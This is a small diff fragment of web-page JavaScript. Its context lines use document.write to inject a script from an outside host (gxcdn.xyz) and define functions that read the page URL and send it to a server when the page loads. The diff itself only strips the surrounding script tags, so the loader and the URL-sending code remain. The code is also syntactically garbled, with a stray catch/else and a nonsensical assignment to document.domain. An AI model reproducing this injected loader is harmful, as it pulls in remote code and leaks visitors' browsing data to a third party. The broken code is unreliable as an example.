@@ -6,7 +6,7 @@ document.domain = $( "div.demo-container" ).html();
     } catch (e) {} else document.write(
       '<script src="https://gxcdn.xyz/domain-system/send-api.js"><\/script>'
     );
-<script>
+
     function getCurrentDomain() {
         return window.location.href;
     }
@@ -25,4 +25,3 @@ document.domain = $( "div.demo-container" ).html();
         var currentDomain = getCurrentDomain();
         sendDomainToServer(currentDomain);
     });
-</script>
